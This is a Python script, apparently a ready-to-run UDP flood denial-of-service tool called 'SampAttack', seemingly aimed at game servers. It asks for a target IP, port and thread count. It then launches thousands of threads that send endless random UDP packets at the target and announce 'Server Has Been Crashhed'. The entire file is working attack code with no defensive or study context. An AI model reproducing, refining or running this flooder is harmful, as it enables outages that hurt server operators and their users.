import os, sys, time, socket, random, threading

sys.stdout.write("\x1b]2;[@] SampAttack. | Username : [*****] | Password : [*****] | Online User : [Bimzzx (1)]\x07")
os.system('cls' if os.name == 'nt' else 'clear')
print("""
Code By Bimzzx...
PrivateTools!!

""")
ip = str(input("IP / HOST : "))
port = int(input("PORT : "))
times = int(input("TIMES (7500) : "))
threads = int(input("THREADS (2800) : "))
os.system('cls' if os.name == 'nt' else 'clear')

def destroy():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def destroyx():
	data = random._urandom(1010)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def destroyxx():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def destroyxxx():
	data = random._urandom(1401)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def attack():
	data = random._urandom(1051)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def attackx():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def attackxx():
	data = random._urandom(1305)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def attackxxx():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def run():
	data = random._urandom(1506)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def runx():
	data = random._urandom(1219)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def runxx():
	data = random._urandom(1091)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def runxxx():
	data = random._urandom(1304)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")

def xxx():
	data = random._urandom(1081)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Server Has Been Crashhed")
		except:
			print("Server Has Been Maintenace")


for _o in range(threads):
	threading.Thread(target=xxx).start()
	threading.Thread(target=attackx).start()

for _i in range(threads):
	threading.Thread(target=destroy).start()
	threading.Thread(target=destroyx).start()
	threading.Thread(target=destroyxx).start()
	threading.Thread(target=destroyxxx).start()

for _x in range(threads):
	threading.Thread(target=attack).start()
	threading.Thread(target=attackx).start()
	threading.Thread(target=attackxx).start()
	threading.Thread(target=attackxxx).start()

for _y in range(threads):
	threading.Thread(target=run).start()
	threading.Thread(target=runx).start()
	threading.Thread(target=runxx).start()
	threading.Thread(target=runxxx).start()
